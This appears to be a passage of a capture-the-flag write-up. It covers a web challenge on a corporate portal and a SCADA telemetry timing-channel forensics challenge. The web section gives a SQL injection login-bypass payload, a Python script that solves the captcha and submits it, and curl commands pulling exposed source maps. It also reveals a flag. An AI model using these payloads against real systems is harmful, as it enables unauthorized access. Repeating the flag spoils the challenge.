1. Web Exploitation: Asterion Group Portal

Challenge Synopsis
Target: http://13.201.205.33/ • Architecture: Nginx, PHP 8.x, SQLite/MySQL backend.
The challenge presents an internal corporate gateway with multiple vulnerability layers: client-side filter bypass, SQL injection on authentication, source map exposure, predictable deterministic hashing (IDOR), and password-protected steganography.

Phase 1: Reconnaissance & Client-Side Filter Bypass

Inspection of login.php showed a restrictive HTML5 regex: pattern="[A-Za-z0-9_]+" designed to block special characters in the browser. In addition, an arithmetic captcha (e.g. 4 + 6 = ?) is validated server-side.

Because input filtering was performed solely on the client side, sending direct POST requests via standard scripts completely bypassed the character restriction: 

# Extract arithmetic captcha dynamically and verify direct access
curl -s http://13.201.205.33/login.php | grep -A 5 "captcha-challenge"

Phase 2: Authentication Bypass via SQL Injection

The application constructed SQL queries by directly interpolating the username field without parameter binding. Supplying an inline SQL comment bypasses password verification. 

# Executed Payload:
Username: priya.sharma' -- -
Password: x
Captcha:  <computed session answer>

Running the authentication bypass via Python: 

import requests, re

s = requests.Session()
r = s.get('http://13.201.205.33/login.php')
a, b = map(int, re.search(r'(\d+)\s*\+\s*(\d+)\s*=\s*\?', r.text).groups())

payload = {
    "username": "priya.sharma' -- -",
    "password": "x",
    "captcha": str(a + b)
}

res = s.post('http://13.201.205.33/login.php', data=payload, allow_redirects=False)
# Response: HTTP 302 -> dashboard.php?id=ac662960d5e262cfd3400bf35ce4813b

Phase 3: Source Map Exposure & ID Algorithm Discovery

The HR dashboard listed employees, including a suspended individual Arjun Mehta under security review HR-017. To access his record, his internal ID hash had to be resolved.

Enumerating static assets revealed the frontend script js/employee-directory.js and its corresponding source map at js/employee-directory.js.map. The unbundled TypeScript source was recovered directly: 

curl -s http://13.201.205.33/js/employee-directory.js.map

Recovered TypeScript function:

/** LPI-V1 compatibility helper retained for migrated personnel links. */
// Migration verification: flag{deterministic_links_are_safe}
export function createPersonnelLink(employee) {
  const prefix = employee.firstName.slice(0, 3).toLowerCase();
  const month = String(employee.birthMonth).padStart(2, '0');

3. Network Forensics: Timeseries Trap

Challenge Synopsis
Artifacts: telemetry.pcap (60.5 MB), sensors.yaml, gateway.log • Focus: Covert Timing Channel Anomaly in SCADA Telemetry.

In this forensic scenario, telemetry messages were transmitted via UDP packets formatted with JSON payloads containing timestamps (ts), sensor IDs (id), and sequence numbers (seq).

Timing Analysis Methodology

Comparing the packet arrival time (PCAP capture timestamp) against the nominal payload timestamp (ts): 

offset = t_arrival - dt.timestamp()

Normal network packets arrived with uniform low latency (~0.01s). Modulated packets delayed by an artificial buffer introduced an offset of > 0.035s, encoding binary 1 (delayed) vs 0 (normal).

Seven suspect sensor streams were isolated:

  • PT-111 (seq 869 - 2387)
  • PT-110 (seq 886 - 2389)
  • FT-113 (seq 2255 - 4050)
  • FT-110 (seq 3897 - 4733)
  • PT-103 (seq 4112 - 4673)
  • FT-107 (seq 4406 - 5899)
  • FT-114 (seq 4417 - 6199)
